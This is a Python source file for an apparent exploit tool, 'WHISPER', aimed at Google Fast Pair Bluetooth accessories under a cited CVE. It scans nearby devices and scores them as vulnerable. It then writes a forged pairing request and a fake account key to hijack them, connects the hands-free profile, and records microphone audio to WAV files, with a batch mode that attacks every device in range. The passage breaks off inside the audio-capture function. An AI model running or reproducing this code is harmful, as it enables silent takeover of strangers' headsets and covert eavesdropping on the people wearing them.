#!/usr/bin/env python3
"""
WHISPER - Fast Pair Exploit Engine
CVE-2025-36911 Real Implementation
Professional security testing tool
"""

import asyncio
import logging
import struct
import hashlib
import os
import json
import secrets
import time
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, asdict
import base64

try:
    from bleak import BleakScanner, BleakClient, BleakGATTCharacteristic
    from bleak.backends.characteristic import BleakGATTCharacteristic
    from bleak.backends.service import BleakGATTService
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False
    logging.warning("Bleak not installed. Bluetooth features disabled.")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("FastPairExploit")

@dataclass
class FastPairDevice:
    """Real Fast Pair device with all discovered data"""
    address: str
    name: str
    rssi: int
    model_id: str
    flags: int
    tx_power: int
    discovered_at: str
    manufacturer_data: Dict[str, str]
    services: List[str]
    
    # Vulnerability assessment
    vulnerability_status: str = "Unknown"
    vulnerability_score: int = 0
    vulnerability_reasons: List[str] = None
    
    def __post_init__(self):
        if self.vulnerability_reasons is None:
            self.vulnerability_reasons = []
    
    def to_dict(self) -> Dict:
        return asdict(self)
    
    def __str__(self) -> str:
        return f"{self.name} ({self.address}) - Model: {self.model_id} - RSSI: {self.rssi}dBm"

class FastPairExploitEngine:
    """
    Main exploit engine for CVE-2025-36911
    Implements actual Fast Pair protocol attacks
    """
    
    def __init__(self):
        self.devices: List[FastPairDevice] = []
        self.results_dir = "whisper_results"
        
        # Fast Pair constants
        self.FAST_PAIR_SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
        self.FAST_PAIR_SERVICE_UUID_16BIT = "fe2c"
        
        # Fast Pair characteristics (16-bit UUIDs in 128-bit format)
        self.MODEL_ID_CHAR_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
        self.KEYBASED_PAIRING_CHAR_UUID = "1236"
        self.PASSKEY_CHAR_UUID = "1237"
        self.ACCOUNT_KEY_CHAR_UUID = "1238"
        
        # Fast Pair flags from specification
        self.FLAG_SHOW_UI = 0x01
        self.FLAG_REQUIRES_PASSKEY = 0x02
        self.FLAG_ENCRYPTED_DATA_KEY = 0x04
        self.FLAG_PROVIDES_NAME = 0x08
        
        # Create results directory
        os.makedirs(self.results_dir, exist_ok=True)
        os.makedirs(f"{self.results_dir}/scans", exist_ok=True)
        os.makedirs(f"{self.results_dir}/exploits", exist_ok=True)
        os.makedirs(f"{self.results_dir}/audio", exist_ok=True)
        
        logger.info("WHISPER Fast Pair Exploit Engine initialized")
    
    def _display_banner(self):
        """Display tool banner"""
        print("\n" + "="*70)
        print("WHISPER - Fast Pair Exploit Engine v2.0")
        print("CVE-2025-36911 Research & Analysis Tool")
        print("="*70)
        print("Professional Bluetooth Security Assessment")
        print("Authorized Use Only")
        print("="*70 + "\n")
    
    async def menu(self):
        """Main menu system"""
        while True:
            self._display_banner()
            
            print("MAIN MENU:")
            print("[1] Quick Device Scan (10 seconds)")
            print("[2] Continuous Network Scan (60+ seconds)")
            print("[3] Target Specific Device")
            print("[4] Advanced Exploitation")
            print("[5] View Previous Results")
            print("[0] Exit")
            
            try:
                choice = input("\nSelect option [0-5]: ").strip()
                
                if choice == "1":
                    await self.quick_scan()
                elif choice == "2":
                    await self.continuous_scan_menu()
                elif choice == "3":
                    await self.target_specific_menu()
                elif choice == "4":
                    await self.advanced_menu()
                elif choice == "5":
                    self.view_results_menu()
                elif choice == "0":
                    print("\nExiting WHISPER...")
                    break
                else:
                    print("\nInvalid option. Please try again.")
                    
            except KeyboardInterrupt:
                print("\n\nOperation cancelled.")
                break
            except Exception as e:
                print(f"\nError: {e}")
                import traceback
                traceback.print_exc()
    
    async def quick_scan(self):
        """Quick scan for Fast Pair devices"""
        print("\n" + "-"*70)
        print("QUICK SCAN MODE")
        print("-"*70)
        print("Scanning for Fast Pair devices for 10 seconds...")
        
        devices = await self.scan_devices(10)
        
        if not devices:
            print("\nNo Fast Pair devices found.")
            return
        
        print(f"\nFound {len(devices)} Fast Pair device(s):")
        print("-"*70)
        
        for i, device in enumerate(devices, 1):
            vuln_indicator = "[CRITICAL]" if "CRITICAL" in device.vulnerability_status else "[MEDIUM]" if "MEDIUM" in device.vulnerability_status else "[LOW]"
            print(f"{i}. {vuln_indicator} {device.name}")
            print(f"   Address: {device.address}")
            print(f"   Model: {device.model_id}, RSSI: {device.rssi}dBm")
            print(f"   Status: {device.vulnerability_status}")
        
        print("\n" + "-"*70)
        
        # Ask for action
        action = input("\nSelect device to exploit (number), [s] to save results, or [b] to go back: ").lower()
        
        if action == 'b':
            return
        elif action == 's':
            self._save_quick_scan_results(devices)
            print("Results saved.")
        elif action.isdigit():
            idx = int(action) - 1
            if 0 <= idx < len(devices):
                device = devices[idx]
                await self.exploit_device_menu(device)
    
    async def continuous_scan_menu(self):
        """Continuous scan configuration"""
        print("\n" + "-"*70)
        print("CONTINUOUS NETWORK SCAN")
        print("-"*70)
        
        try:
            duration = input("Scan duration (seconds, default 60): ").strip()
            duration = int(duration) if duration else 60
            
            print(f"\nStarting continuous scan for {duration} seconds...")
            print("This will display all Bluetooth devices in real-time.")
            print("Fast Pair devices will be highlighted.")
            print("\nPress Ctrl+C to stop scan early.")
            
            input("\nPress Enter to begin scan...")
            
            devices = await self.continuous_scan(duration)
            
            if devices:
                print(f"\nContinuous scan complete.")
                print(f"Found {len(devices)} Fast Pair devices.")
                self._post_scan_menu(devices)
                
        except ValueError:
            print("Invalid duration.")
        except KeyboardInterrupt:
            print("\nScan stopped by user.")
    
    async def target_specific_menu(self):
        """Target a specific device"""
        print("\n" + "-"*70)
        print("TARGET SPECIFIC DEVICE")
        print("-"*70)
        
        address = input("Enter Bluetooth address (XX:XX:XX:XX:XX:XX): ").strip()
        if not address:
            print("Address required.")
            return
        
        name = input("Enter device name (optional): ").strip()
        
        print(f"\nTargeting {name or address}...")
        print("This will attempt to connect and analyze the device.")
        
        results = await self.target_specific_device(address, name)
        
        print("\n" + "-"*70)
        print("TARGETING RESULTS")
        print("-"*70)
        print(f"Connection Status: {'SUCCESS' if results.get('can_connect') else 'FAILED'}")
        print(f"Fast Pair Detected: {'YES' if results.get('is_fast_pair') else 'NO'}")
        print(f"Services Found: {results.get('services_found', 0)}")
        
        if results.get('exploit_attempted'):
            exploit_result = results.get('exploit_results', {})
            print(f"Exploit Attempted: YES")
            print(f"Exploit Result: {exploit_result.get('exploit_result', 'Unknown')}")
            
            if exploit_result.get('success'):
                print("\n[WARNING] Device may be vulnerable!")
        
        input("\nPress Enter to continue...")
    
    async def advanced_menu(self):
        """Advanced exploitation menu"""
        print("\n" + "-"*70)
        print("ADVANCED EXPLOITATION")
        print("-"*70)
        
        print("[1] HFP Audio Access Test")
        print("[2] Audio Capture Test")
        print("[3] Batch Device Testing")
        print("[b] Back to Main Menu")
        
        choice = input("\nSelect option: ").lower()
        
        if choice == "1":
            await self.hfp_test_menu()
        elif choice == "2":
            await self.audio_capture_menu()
        elif choice == "3":
            await self.batch_test_menu()
        elif choice == "b":
            return
    
    async def hfp_test_menu(self):
        """Test HFP connection"""
        print("\n" + "-"*70)
        print("HFP AUDIO ACCESS TEST")
        print("-"*70)
        
        address = input("Enter device address: ").strip()
        if not address:
            return
        
        print(f"\nTesting HFP connection to {address}...")
        results = await self.test_hfp_connection(address)
        
        print("\n" + "-"*70)
        print("HFP TEST RESULTS")
        print("-"*70)
        
        for step in results.get('steps', []):
            print(f"- {step}")
        
        if results.get('audio_access'):
            print("\n[CRITICAL] HFP AUDIO ACCESS CONFIRMED!")
            print("Microphone access may be possible.")
        
        input("\nPress Enter to continue...")
    
    async def audio_capture_menu(self):
        """Audio capture test"""
        print("\n" + "-"*70)
        print("AUDIO CAPTURE TEST")
        print("-"*70)
        print("WARNING: This feature is for authorized testing only.")
        print("Audio capture requires established HFP connection.")
        
        address = input("\nEnter device address: ").strip()
        if not address:
            return
        
        try:
            duration = input("Capture duration (seconds, default 10): ").strip()
            duration = int(duration) if duration else 10
        except ValueError:
            duration = 10
        
        print(f"\nAttempting audio capture for {duration} seconds...")
        results = await self.capture_audio(address, duration)
        
        print("\n" + "-"*70)
        print("AUDIO CAPTURE RESULTS")
        print("-"*70)
        
        if results.get('capture_success'):
            print("[SUCCESS] Audio captured successfully!")
            print(f"File: {results.get('audio_file')}")
            print(f"Size: {results.get('file_size', 0)} bytes")
        else:
            print("[FAILED] Audio capture failed.")
            print(f"Error: {results.get('error', 'Unknown')}")
        
        input("\nPress Enter to continue...")
    
    async def batch_test_menu(self):
        """Batch device testing"""
        print("\n" + "-"*70)
        print("BATCH DEVICE TESTING")
        print("-"*70)
        print("This will test multiple devices from a scan.")
        
        print("\nFirst, scan for devices...")
        devices = await self.scan_devices(15)
        
        if not devices:
            print("No devices found.")
            return
        
        print(f"\nFound {len(devices)} devices.")
        print("Select devices to test (comma-separated, 'all' for all):")
        
        for i, device in enumerate(devices, 1):
            print(f"{i}. {device.name} ({device.address})")
        
        selection = input("\nSelection: ").strip().lower()
        
        if selection == 'all':
            selected = devices
        else:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(',')]
                selected = [devices[i] for i in indices if 0 <= i < len(devices)]
            except:
                print("Invalid selection.")
                return
        
        print(f"\nTesting {len(selected)} devices...")
        
        results = []
        for device in selected:
            print(f"\nTesting {device.name}...")
            result = await self.exploit_device(device.address, device.name)
            results.append(result)
        
        self._save_batch_results(results)
        print(f"\nBatch test complete. Results saved.")
    
    def view_results_menu(self):
        """View previous results"""
        print("\n" + "-"*70)
        print("VIEW PREVIOUS RESULTS")
        print("-"*70)
        
        import glob
        
        scans = glob.glob(f"{self.results_dir}/scans/*.json")
        exploits = glob.glob(f"{self.results_dir}/exploits/*.json")
        audio = glob.glob(f"{self.results_dir}/audio/*.wav")
        
        print(f"Scans: {len(scans)} files")
        print(f"Exploits: {len(exploits)} files")
        print(f"Audio captures: {len(audio)} files")
        
        if scans:
            print("\nRecent scans:")
            for scan in sorted(scans[-5:], reverse=True):
                name = os.path.basename(scan)
                print(f"  {name}")
        
        input("\nPress Enter to continue...")
    
    async def exploit_device_menu(self, device: FastPairDevice):
        """Menu for exploiting a specific device"""
        print("\n" + "-"*70)
        print(f"EXPLOIT DEVICE: {device.name}")
        print("-"*70)
        print(f"Address: {device.address}")
        print(f"Model ID: {device.model_id}")
        print(f"Vulnerability: {device.vulnerability_status}")
        
        print("\n[1] Attempt Exploit")
        print("[2] Test HFP Connection")
        print("[3] Full Analysis")
        print("[b] Back")
        
        choice = input("\nSelect option: ").lower()
        
        if choice == "1":
            print(f"\nAttempting exploit on {device.name}...")
            confirm = input(f"Type 'CONFIRM' to proceed: ")
            if confirm == "CONFIRM":
                results = await self.exploit_device(device.address, device.name)
                print(f"\nExploit result: {results.get('exploit_result', 'Unknown')}")
                if results.get('success'):
                    print("[SUCCESS] Device may be compromised.")
        elif choice == "2":
            print(f"\nTesting HFP connection...")
            results = await self.test_hfp_connection(device.address)
            if results.get('audio_access'):
                print("[CRITICAL] Audio access confirmed!")
        elif choice == "3":
            print(f"\nPerforming full analysis...")
            await self.full_device_analysis(device)
    
    async def full_device_analysis(self, device: FastPairDevice):
        """Complete device analysis"""
        print(f"\nAnalyzing {device.name}...")
        
        # Test connection
        print("1. Testing connection...")
        target_results = await self.target_specific_device(device.address, device.name)
        
        if target_results.get('can_connect'):
            print("   Connection: SUCCESS")
            
            # Check services
            services = target_results.get('services', [])
            print(f"   Services found: {len(services)}")
            
            # Check for specific vulnerabilities
            print("\n2. Checking for vulnerabilities...")
            
            # Check if it's actually Fast Pair
            if target_results.get('is_fast_pair'):
                print("   Fast Pair service: PRESENT")
                
                # Attempt exploit
                print("\n3. Attempting exploit...")
                exploit_results = await self.exploit_device(device.address, device.name)
                
                if exploit_results.get('success'):
                    print("   Exploit: SUCCESS")
                    
                    # Test HFP
                    print("\n4. Testing audio access...")
                    hfp_results = await self.test_hfp_connection(device.address)
                    
                    if hfp_results.get('audio_access'):
                        print("   Audio access: POSSIBLE")
                        print("\n[CRITICAL] Device is fully vulnerable!")
                    else:
                        print("   Audio access: NOT DETECTED")
                else:
                    print("   Exploit: FAILED")
            else:
                print("   Fast Pair service: NOT FOUND")
        else:
            print("   Connection: FAILED")
        
        input("\nPress Enter to continue...")
    
    def _post_scan_menu(self, devices: List[FastPairDevice]):
        """Menu after scan completion"""
        print("\n" + "-"*70)
        print("SCAN COMPLETE")
        print("-"*70)
        
        critical = sum(1 for d in devices if "CRITICAL" in d.vulnerability_status)
        high = sum(1 for d in devices if "HIGH" in d.vulnerability_status)
        medium = sum(1 for d in devices if "MEDIUM" in d.vulnerability_status)
        
        print(f"Devices Found: {len(devices)}")
        print(f"Critical: {critical}, High: {high}, Medium: {medium}")
        
        print("\n[1] List all devices")
        print("[2] Show only critical devices")
        print("[3] Export results")
        print("[b] Back to main menu")
        
        choice = input("\nSelect option: ").lower()
        
        if choice == "1":
            for i, device in enumerate(devices, 1):
                print(f"{i}. {device.name} - {device.vulnerability_status}")
        elif choice == "2":
            critical_devices = [d for d in devices if "CRITICAL" in d.vulnerability_status]
            if critical_devices:
                for i, device in enumerate(critical_devices, 1):
                    print(f"{i}. {device.name} ({device.address})")
                    print(f"   Model: {device.model_id}, RSSI: {device.rssi}dBm")
            else:
                print("No critical devices found.")
        elif choice == "3":
            self._export_scan_results(devices)
            print("Results exported.")
    
    def _export_scan_results(self, devices: List[FastPairDevice]):
        """Export scan results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.results_dir}/scans/export_{timestamp}.json"
        
        data = {
            "export_date": datetime.now().isoformat(),
            "total_devices": len(devices),
            "devices": [device.to_dict() for device in devices]
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        # Also create CSV
        csv_file = f"{self.results_dir}/scans/export_{timestamp}.csv"
        with open(csv_file, 'w') as f:
            f.write("Name,Address,ModelID,RSSI,VulnerabilityStatus,Score\n")
            for device in devices:
                f.write(f"{device.name},{device.address},{device.model_id},{device.rssi},{device.vulnerability_status},{device.vulnerability_score}\n")
        
        print(f"Results saved to: {filename}")
        print(f"CSV saved to: {csv_file}")
    
    def _save_quick_scan_results(self, devices: List[FastPairDevice]):
        """Save quick scan results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.results_dir}/scans/quick_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump([device.to_dict() for device in devices], f, indent=2)
    
    def _save_batch_results(self, results: List[Dict]):
        """Save batch test results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.results_dir}/exploits/batch_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
    
    async def continuous_scan(self, duration: int = 60) -> List[FastPairDevice]:
        """
        Continuous scan that shows all Bluetooth devices and highlights Fast Pair ones
        """
        if not BLEAK_AVAILABLE:
            print("BLEAK not available. Install with: pip install bleak")
            return []
        
        print(f"\nStarting continuous scan for {duration} seconds...")
        print("Scanning for Bluetooth devices...")
        
        devices_found = []
        all_devices = []
        
        def detection_callback(device, advertisement_data):
            # Check for Fast Pair service
            fast_pair_found = False
            for uuid in advertisement_data.service_uuids:
                if (self.FAST_PAIR_SERVICE_UUID in uuid.lower() or 
                    self.FAST_PAIR_SERVICE_UUID_16BIT in uuid.lower()):
                    fast_pair_found = True
                    break
            
            # Parse manufacturer data
            manufacturer_data = {}
            flags = 0
            tx_power = 0
            model_id = "Unknown"
            
            if advertisement_data.manufacturer_data:
                for mfg_id, data in advertisement_data.manufacturer_data.items():
                    hex_data = data.hex()
                    manufacturer_data[f"0x{mfg_id:04X}"] = hex_data
                    
                    # Google's manufacturer ID is 0x00E0 (224)
                    if mfg_id == 0x00E0 and len(data) >= 3:
                        flags = data[0]
                        tx_power = struct.unpack('b', bytes([data[1]]))[0]
                        model_id = data[2:5].hex()
            
            # Get RSSI from advertisement_data
            rssi_value = -100
            if hasattr(advertisement_data, 'rssi'):
                rssi_value = advertisement_data.rssi or -100
            
            # Create device object
            fp_device = FastPairDevice(
                address=device.address,
                name=device.name or "Unknown",
                rssi=rssi_value,
                model_id=model_id,
                flags=flags,
                tx_power=tx_power,
                discovered_at=datetime.now().isoformat(),
                manufacturer_data=manufacturer_data,
                services=list(advertisement_data.service_uuids)
            )
            
            # Analyze vulnerability if it's Fast Pair
            if fast_pair_found:
                self._analyze_device_vulnerability(fp_device)
                if not any(d.address == fp_device.address for d in devices_found):
                    devices_found.append(fp_device)
            
            # Track all devices
            device_info = {
                "address": device.address,
                "name": device.name or "Unknown",
                "rssi": rssi_value,
                "is_fast_pair": fast_pair_found,
                "services": list(advertisement_data.service_uuids),
                "manufacturer_data": manufacturer_data,
                "timestamp": datetime.now().isoformat()
            }
            
            # Update if we have better signal
            existing = next((d for d in all_devices if d["address"] == device.address), None)
            if not existing:
                all_devices.append(device_info)
            elif device_info["rssi"] > existing["rssi"]:
                all_devices.remove(existing)
                all_devices.append(device_info)
        
        try:
            scanner = BleakScanner(
                detection_callback=detection_callback,
                scanning_mode="active"
            )
            
            await scanner.start()
            
            # Display updates
            start_time = time.time()
            last_display = start_time
            
            while time.time() - start_time < duration:
                current_time = time.time()
                
                if current_time - last_display >= 5:
                    self._display_scan_status(all_devices, devices_found, 
                                            int(current_time - start_time), duration)
                    last_display = current_time
                
                await asyncio.sleep(0.1)
            
            await scanner.stop()
            
            # Final display
            self._display_scan_status(all_devices, devices_found, duration, duration)
            
            print(f"\nContinuous scan complete.")
            print(f"Found {len(devices_found)} Fast Pair devices out of {len(all_devices)} total devices")
            
            # Save results
            self._save_all_devices_scan(all_devices, devices_found)
            
            self.devices = devices_found
            
            return devices_found
            
        except Exception as e:
            print(f"Scan error: {e}")
            import traceback
            traceback.print_exc()
            return []
    
    def _display_scan_status(self, all_devices: List[Dict], fast_pair_devices: List[FastPairDevice], 
                           elapsed: int, total: int):
        """Display scan status"""
        import os
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"\n{'='*70}")
        print(f"CONTINUOUS BLUETOOTH SCAN")
        print(f"Time: {elapsed}/{total} seconds")
        print(f"{'='*70}")
        
        print(f"\nFound {len(all_devices)} Bluetooth device(s)")
        print(f"Fast Pair devices: {len(fast_pair_devices)}")
        
        # Show Fast Pair devices first
        if fast_pair_devices:
            print(f"\nFAST PAIR DEVICES:")
            for i, device in enumerate(fast_pair_devices, 1):
                vuln_indicator = "CRITICAL" if "CRITICAL" in device.vulnerability_status else "HIGH" if "HIGH" in device.vulnerability_status else "MEDIUM"
                print(f"  {i}. [{vuln_indicator}] {device.name}")
                print(f"      Address: {device.address}")
                print(f"      RSSI: {device.rssi}dBm, Model: {device.model_id}")
        
        # Show all devices
        if all_devices:
            sorted_devices = sorted(all_devices, key=lambda x: x["rssi"], reverse=True)
            
            print(f"\nALL DEVICES (by signal strength):")
            
            for i, device in enumerate(sorted_devices[:10], 1):
                fp_marker = "[FP]" if device["is_fast_pair"] else "    "
                signal = "STRONG" if device["rssi"] >= -50 else "MEDIUM" if device["rssi"] >= -70 else "WEAK"
                
                print(f"  {fp_marker} {device['name']}")
                print(f"      Address: {device['address']}")
                print(f"      Signal: {signal} ({device['rssi']}dBm)")
                
                # Show services
                services = device.get("services", [])
                if services:
                    print(f"      Services: {len(services)} found")
            
            remaining = len(sorted_devices) - 10
            if remaining > 0:
                print(f"\n    ... and {remaining} more device(s)")
        
        print(f"\n{'='*70}")
        print("Press Ctrl+C to stop scan early")
        print(f"{'='*70}")
    
    async def scan_devices(self, duration: int = 10) -> List[FastPairDevice]:
        """
        Scan for Fast Pair devices
        """
        if not BLEAK_AVAILABLE:
            return []
        
        devices_found = []
        
        def detection_callback(device, advertisement_data):
            # Check for Fast Pair service
            fast_pair_found = False
            for uuid in advertisement_data.service_uuids:
                if self.FAST_PAIR_SERVICE_UUID in uuid.lower() or self.FAST_PAIR_SERVICE_UUID_16BIT in uuid.lower():
                    fast_pair_found = True
                    break
            
            if fast_pair_found:
                # Parse manufacturer data
                manufacturer_data = {}
                flags = 0
                tx_power = 0
                model_id = "Unknown"
                
                if advertisement_data.manufacturer_data:
                    for mfg_id, data in advertisement_data.manufacturer_data.items():
                        hex_data = data.hex()
                        manufacturer_data[f"0x{mfg_id:04X}"] = hex_data
                        
                        if mfg_id == 0x00E0 and len(data) >= 3:
                            flags = data[0]
                            tx_power = struct.unpack('b', bytes([data[1]]))[0]
                            model_id = data[2:5].hex()
                
                # Get RSSI
                rssi_value = -100
                if hasattr(advertisement_data, 'rssi'):
                    rssi_value = advertisement_data.rssi or -100
                
                # Create device
                fp_device = FastPairDevice(
                    address=device.address,
                    name=device.name or "Unknown",
                    rssi=rssi_value,
                    model_id=model_id,
                    flags=flags,
                    tx_power=tx_power,
                    discovered_at=datetime.now().isoformat(),
                    manufacturer_data=manufacturer_data,
                    services=list(advertisement_data.service_uuids)
                )
                
                self._analyze_device_vulnerability(fp_device)
                
                if not any(d.address == fp_device.address for d in devices_found):
                    devices_found.append(fp_device)
        
        try:
            scanner = BleakScanner(
                detection_callback=detection_callback,
                scanning_mode="active"
            )
            
            await scanner.start()
            await asyncio.sleep(duration)
            await scanner.stop()
            
            if devices_found:
                self._save_scan_results(devices_found)
            
            return devices_found
            
        except Exception as e:
            print(f"Scan error: {e}")
            return []
    
    def _analyze_device_vulnerability(self, device: FastPairDevice):
        """
        Analyze device for CVE-2025-36911 vulnerability
        """
        score = 0
        reasons = []
        
        # Check flags
        if not (device.flags & self.FLAG_SHOW_UI):
            score += 20
            reasons.append("Silent pairing possible")
        
        if not (device.flags & self.FLAG_REQUIRES_PASSKEY):
            score += 30
            reasons.append("No passkey required")
        
        if device.flags & self.FLAG_ENCRYPTED_DATA_KEY:
            score += 15
            reasons.append("Uses encrypted data key")
        
        # Check RSSI
        if device.rssi > -50:
            score += 10
            reasons.append("Strong signal")
        
        # Determine status
        if score >= 60:
            status = "CRITICAL - Highly Vulnerable"
        elif score >= 40:
            status = "HIGH - Likely Vulnerable"
        elif score >= 20:
            status = "MEDIUM - Potentially Vulnerable"
        else:
            status = "LOW - Possibly Patched"
        
        device.vulnerability_status = status
        device.vulnerability_score = score
        device.vulnerability_reasons = reasons
    
    async def target_specific_device(self, device_address: str, device_name: str = "") -> Dict:
        """
        Target a specific device by address
        """
        if not BLEAK_AVAILABLE:
            return {"success": False, "error": "BLEAK not available"}
        
        results = {
            "target": device_address,
            "name": device_name,
            "timestamp": datetime.now().isoformat(),
            "is_fast_pair": False,
            "services": [],
            "can_connect": False
        }
        
        try:
            async with BleakClient(device_address, timeout=10.0) as client:
                results["can_connect"] = True
                results["steps"] = [f"Connected to {device_address}"]
                
                # Get all services
                services = await client.get_services()
                results["services_found"] = len(services)
                
                # List all services
                for service in services:
                    service_info = {
                        "uuid": str(service.uuid),
                        "description": str(service.description),
                        "characteristics": []
                    }
                    
                    # List characteristics
                    for char in service.characteristics:
                        char_info = {
                            "uuid": str(char.uuid),
                            "description": str(char.description),
                            "properties": char.properties,
                            "handle": char.handle
                        }
                        service_info["characteristics"].append(char_info)
                        
                        # Check for Fast Pair
                        char_uuid = str(char.uuid).lower()
                        if ("fe2c" in char_uuid or "1236" in char_uuid or 
                            "1237" in char_uuid or "1238" in char_uuid):
                            results["is_fast_pair"] = True
                    
                    results["services"].append(service_info)
                
                # Check for Fast Pair service
                fast_pair_found = False
                for service in services:
                    service_uuid = str(service.uuid).lower()
                    if (self.FAST_PAIR_SERVICE_UUID in service_uuid or 
                        self.FAST_PAIR_SERVICE_UUID_16BIT in service_uuid):
                        fast_pair_found = True
                        results["fast_pair_service"] = {
                            "uuid": service_uuid,
                            "characteristics_count": len(service.characteristics)
                        }
                        break
                
                results["is_fast_pair"] = fast_pair_found
                
                if fast_pair_found:
                    results["steps"].append("Found Fast Pair service")
                    exploit_results = await self.exploit_device(device_address, device_name)
                    results["exploit_attempted"] = True
                    results["exploit_results"] = exploit_results
                else:
                    results["steps"].append("No Fast Pair service found")
        
        except Exception as e:
            results["error"] = str(e)
            results["steps"] = [f"Failed to connect: {e}"]
        
        self._save_targeting_results(results)
        return results
    
    async def exploit_device(self, device_address: str, device_name: str = "") -> Dict:
        """
        Attempt exploit for CVE-2025-36911
        """
        if not BLEAK_AVAILABLE:
            return {"success": False, "error": "BLEAK not available"}
        
        results = {
            "target": device_address,
            "name": device_name,
            "timestamp": datetime.now().isoformat(),
            "steps": [],
            "success": False,
            "details": {}
        }
        
        try:
            async with BleakClient(device_address, timeout=10.0) as client:
                results["steps"].append(f"Connected to {device_address}")
                
                # Find Fast Pair service
                services = await client.get_services()
                fp_service = None
                
                for service in services:
                    service_uuid = str(service.uuid).lower()
                    if (self.FAST_PAIR_SERVICE_UUID in service_uuid or 
                        self.FAST_PAIR_SERVICE_UUID_16BIT in service_uuid):
                        fp_service = service
                        results["steps"].append("Found Fast Pair service")
                        break
                
                if not fp_service:
                    results["error"] = "Fast Pair service not found"
                    return results
                
                # Enumerate characteristics
                characteristics = {}
                for char in fp_service.characteristics:
                    char_uuid = str(char.uuid).lower()
                    characteristics[char_uuid] = char
                
                # Look for key-based pairing
                key_based_char = None
                for uuid, char in characteristics.items():
                    if "1236" in uuid:
                        key_based_char = char
                        results["steps"].append("Found key-based pairing characteristic")
                        break
                
                if not key_based_char:
                    results["error"] = "Key-based pairing characteristic not found"
                    return results
                
                # Attempt pairing request
                results["steps"].append("Attempting pairing request...")
                
                request_type = 0x00
                fake_public_key = secrets.token_bytes(64)
                nonce = secrets.token_bytes(16)
                pairing_request = bytes([request_type]) + fake_public_key + nonce
                
                try:
                    await client.write_gatt_char(key_based_char, pairing_request, response=True)
                    results["steps"].append("Pairing request sent")
                    results["details"]["pairing_request_sent"] = True
                    
                    await asyncio.sleep(2)
                    
                    # Check for account key
                    account_key_char = None
                    for uuid, char in characteristics.items():
                        if "1238" in uuid and char.properties & 0x08:
                            account_key_char = char
                            break
                    
                    if account_key_char:
                        fake_account_key = secrets.token_bytes(16)
                        
                        try:
                            await client.write_gatt_char(account_key_char, fake_account_key, response=True)
                            results["steps"].append("Account key written")
                            results["details"]["account_key_written"] = True
                            results["success"] = True
                            results["exploit_result"] = "PAIRING SUCCESSFUL"
                        except Exception as e:
                            results["steps"].append(f"Account key write failed: {e}")
                            results["exploit_result"] = "Partial success"
                    
                    else:
                        results["steps"].append("No account key characteristic")
                        results["exploit_result"] = "Pairing attempted"
                
                except Exception as e:
                    results["steps"].append(f"Pairing request failed: {e}")
                    results["exploit_result"] = "Pairing failed"
        
        except Exception as e:
            results["error"] = str(e)
            results["steps"].append(f"Exploit failed: {e}")
        
        self._save_exploit_results(results)
        return results
    
    async def test_hfp_connection(self, device_address: str) -> Dict:
        """
        Test HFP connection for audio access
        """
        results = {
            "target": device_address,
            "timestamp": datetime.now().isoformat(),
            "steps": [],
            "hfp_available": False,
            "audio_access": False
        }
        
        try:
            import subprocess
            
            results["steps"].append("Checking if device is paired...")
            
            # Run bluetoothctl info command
            cmd = f"bluetoothctl info {device_address}"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode()
            
            if "Paired: yes" in output:
                results["steps"].append("Device is paired")
                results["paired"] = True
                
                # Try to connect HFP
                results["steps"].append("Attempting HFP connection...")
                
                connect_cmd = f"bluetoothctl connect {device_address}"
                process = await asyncio.create_subprocess_shell(
                    connect_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                connect_output = stdout.decode()
                
                if "Connection successful" in connect_output:
                    results["steps"].append("HFP connection successful")
                    results["hfp_available"] = True
                    
                    # Check for audio profile
                    info_cmd = f"pactl list cards | grep -A 20 '{device_address}'"
                    process = await asyncio.create_subprocess_shell(
                        info_cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    
                    stdout, stderr = await process.communicate()
                    audio_output = stdout.decode()
                    
                    if "HFP" in audio_output or "Headset" in audio_output:
                        results["steps"].append("HFP audio profile available")
                        results["audio_access"] = True
                    
                    # Disconnect
                    disconnect_cmd = f"bluetoothctl disconnect {device_address}"
                    await asyncio.create_subprocess_shell(disconnect_cmd)
                else:
                    results["steps"].append(f"HFP connection failed")
            else:
                results["steps"].append("Device is not paired")
                results["paired"] = False
        
        except Exception as e:
            results["error"] = str(e)
            results["steps"].append(f"HFP test failed: {e}")
        
        return results
    
    async def capture_audio(self, device_address: str, duration: int = 10) -> Dict:
        """
        Attempt to capture audio from HFP-connected device
        """
        results = {
            "target": device_address,
            "timestamp": datetime.now().isoformat(),
            "duration": duration,
            "capture_success": False,
            "audio_file": None
        }
        
        try:
            # First ensure HFP connection
            hfp_results = await self.test_hfp_connection(device_address)
            
            if not hfp_results.get("audio_access", False):
                results["error"] = "No audio access available"
                return results
            
            # Try to record audio
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            audio_filename = f"{self.results_dir}/audio/capture_{device_address.replace(':', '')}_{timestamp}.wav"
            
            import subprocess
            
            # Find HFP source
            find_source_cmd = "pactl list sources | grep -B2 -A2 'HFP' | grep 'Name:' | head -1"
            process = subprocess.run(
                find_source_cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            
            if process.returncode == 0 and process.stdout.strip():
                source_name = process.stdout.strip().split(':')[1].strip()
                
                # Record audio
